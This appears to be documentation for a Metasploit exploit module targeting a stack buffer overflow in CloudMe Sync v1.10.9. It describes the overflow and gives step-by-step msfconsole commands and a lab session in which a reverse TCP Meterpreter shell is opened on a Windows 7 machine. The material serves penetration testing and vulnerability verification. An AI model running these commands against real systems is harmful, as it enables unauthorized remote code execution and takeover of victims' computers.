## Description

This module exploits a buffer overflow vulnerability found in [CloudMe Sync v1.10.9](https://www.cloudme.com/downloads/CloudMe_1109.exe).

## Vulnerable Application

`CloudMe.00564B00` sets up a buffer that is intended to take up 1048 bytes on the stack to read in data from port 8888. The CloudMe function then passes a pointer to the stack buffer and a max size to `Qt5Core._ZN9QIODevice4readEPcx`.

![alt text](https://user-images.githubusercontent.com/40177151/44545528-f21f0280-a6da-11e8-898b-edd0a17e0d10.png "CloudMe.00564B00")

The call to `Qt5Core._ZN9QIODevice4readEPcx` shows the pointer and the max size arguments passed in by `CloudMe.00564B00`.
![alt text](https://user-images.githubusercontent.com/40177151/44545559-09f68680-a6db-11e8-8a0b-36466dafd21e.png "Qt Read Args")

Because neither functions check the max size against the actual amount of space allocated on the stack, the program writes past the buffer's allocated space and allows for arbitrary code execution.

## Verification Steps
  1. Install CloudMe for Desktop version `v1.10.9`
  2. Start the application (you don't need to create an account)
  3. Start `msfconsole`
  4. Do `use exploit/windows/misc/cloudme_sync`
  5. Do `set RHOST ip`
  6. Do `set LHOST ip`
  7. Do `exploit`
  8. Verify the Meterpreter session is opened

## Scenarios

### CloudMe Sync client application on Windows 7 SP1 x86

```
msf > use exploit/windows/misc/cloudme_sync 
msf exploit(windows/misc/cloudme_sync) > set RHOST 172.16.40.148
RHOST => 172.16.40.148
msf exploit(windows/misc/cloudme_sync) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(windows/misc/cloudme_sync) > set LHOST 172.16.40.5 
LHOST => 172.16.40.5
msf exploit(windows/misc/cloudme_sync) > exploit 

[*] Started reverse TCP handler on 172.16.40.5:4444 
[*] Sending stage (179779 bytes) to 172.16.40.148
[*] Meterpreter session 1 opened (172.16.40.5:4444 -> 172.16.40.148:57185) at 2018-02-19 12:35:21 +0000

meterpreter > sysinfo 
Computer        : PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x86
System Language : pt_PT
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >
```
